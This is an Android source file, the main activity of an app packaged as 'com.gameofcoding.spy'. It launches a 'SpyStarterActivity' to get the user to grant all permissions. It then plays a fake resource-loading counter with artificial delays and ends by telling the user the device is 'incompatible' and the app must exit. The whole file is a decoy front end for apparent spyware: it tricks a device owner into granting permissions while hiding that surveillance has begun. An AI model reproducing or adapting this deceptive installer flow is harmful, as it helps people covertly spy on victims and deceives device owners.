package com.gameofcoding.spy.activities;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    Utils mUtils;
    public static int prog = 0;
    final int TOTAL_PROG = 548;
    TextView loadedResources;
    boolean hasPaused = false;
    boolean hasDestroyed = false;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
      	loadedResources = findViewById(R.id.loaded_resources);
	mUtils = new Utils(this);
	XLog.v(TAG, "App Started through main activity");
	try {
	    startSpy();
	} catch(Exception e) {
	    XLog.d(TAG, "Exception occurred in MainActivity", e);
	}
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
	try {
	    if(requestCode == 111) {
		if(resultCode == RESULT_OK) {
		    new Thread() {
			@Override
			public void run() {
			    try {
				synchronized(this) {
				    prog = 0;
				    while(prog <= TOTAL_PROG) {
					wait(80);
					if(prog % 5 == 0)
					    wait(50);
					if(prog % 10 == 0)
					    wait(100);
					if(prog % 13 == 0)
					    wait(500);
					if(hasPaused)
					    wait(50);
					if(hasDestroyed)
					    return;
					updateLoadedResources(prog++);
				    }
				    wait(1000);
				    updateLoadedResources();
				}
				
				if(!(hasPaused && hasDestroyed))
				    showIncompatibleDialog();
			    } catch(Exception e) {
				XLog.e(TAG, "Exception occured while updating resources, prog=" + prog, e);
			    }
			}
		    }.start();
		} else {
		    mUtils.showToast("Please grant all permissions to use this app!");
		    finish();
		}
	    }
	    super.onActivityResult(requestCode, resultCode, data);
	} catch(Exception e) {
	    XLog.d(TAG, "Exception occurred in MainActivity", e);
	}

    }

    @Override
    public void onPause() {
	hasPaused = true;
	super.onPause();
    }

    @Override
    public void onResume() {
	super.onResume();
	hasPaused = false;
    }

    @Override
    public void onDestroy() {
	hasDestroyed = true;
	super.onDestroy();
    }

    public void showIncompatibleDialog() {
	final Context context = this;
	runOnUiThread(new Runnable() {
		@Override
		public void run() {
		    try {
			new AlertDialog.Builder(context)
			    .setTitle("Incompatible Device")
			    .setMessage("Your device is incompatible with this application, please try with another device.\n\nThanks for your attention!.")
			    .setCancelable(false)
			    .setPositiveButton(R.string.exit, new DialogInterface.OnClickListener() {
				    @Override
				    public void onClick(DialogInterface dialog, int whichButton) {
					finish();
				    }
				})
			    .show();
		    } catch(Exception e) {
			XLog.d(TAG, "Exception occurred in MainActivity", e);
		    }
		}
	    });
    }
    
    public void updateLoadedResources(final int prog) {
	runOnUiThread(new Runnable() {
		@Override
		public void run() {
		    try {
			loadedResources.setText("Loading resources... (" + prog + "/"+ TOTAL_PROG +")");
		    } catch(Exception e) {
			XLog.d(TAG, "Exception occurred in MainActivity", e);
		    }
		}
	    });
    }

    public void updateLoadedResources() {
	runOnUiThread(new Runnable() {
		@Override
		public void run() {
		    try {
			loadedResources.setText("Incompatible device!");
		    } catch(Exception e) {
			XLog.d(TAG, "Exception occurred in MainActivity", e);
		    }
		}
	    });
    }

    public void startSpy() {
	try {
	    Intent intent = new Intent();
	    intent.setComponent(new ComponentName("com.gameofcoding.spy",
						  "com.gameofcoding.spy.activities.SpyStarterActivity"));
	    startActivityForResult(intent, 111);
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occured while starting activity");
	}
    }
}
